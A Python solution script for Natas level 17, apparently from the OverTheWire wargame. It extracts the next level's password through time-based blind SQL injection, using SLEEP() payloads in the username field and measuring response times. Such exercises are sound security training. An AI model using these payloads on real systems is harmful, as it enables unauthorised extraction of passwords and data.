import time

import requests

import utils

LEVEL = 17
ASCII_CHARS = utils.ASCII_CHARS
NEXT_LEVEL = "natas18"


def determine_request_time(session, url, auth, payload):
    start_time = time.time()
    data = {'username': payload}
    session.post(url, auth=auth, data=data)
    return time.time() - start_time


def obtain_password_chars(session, url, auth):
    """ sql injection that determines each character in the password """
    password = ''
    for char in ASCII_CHARS:
        payload = f'{NEXT_LEVEL}" AND IF(BINARY password LIKE "%{char}%", SLEEP(2), False) #'
        elapsed_time = determine_request_time(session, url, auth, payload)
        print(char, end=' ')
        if elapsed_time > 1:
            password += char
            print('password chars: ', password)
    return password


def retrieve_password(session, url, auth, password_chars_file):
    """ tests the order of each character from obtain_password_chars(...)
    and determines the actual password """
    password = ''
    while len(password) < 32:
        password_chars = utils.read_file(password_chars_file)
        for char in password_chars:
            print(char, end=' ')
            payload = f'{NEXT_LEVEL}" AND IF(BINARY password LIKE "{password + char}%", SLEEP(2), False) #'
            elapsed_time = determine_request_time(session, url, auth, payload)
            if elapsed_time > 1:
                password += char
                print(f"Current password: {password}")
                break
    return password


def main():
    username, password, url, auth = utils.get_natas_credentials(LEVEL)
    password_chars_file = 'password_characters.txt'
    with requests.Session() as session:
        if utils.is_file_missing_or_empty(password_chars_file):
            obtained_password_chars = obtain_password_chars(session, url, auth)
            utils.save_file(password_chars_file, obtained_password_chars)
        password = retrieve_password(session, url, auth, password_chars_file)
        utils.save_file('out.txt', password)


if __name__ == "__main__":
    main()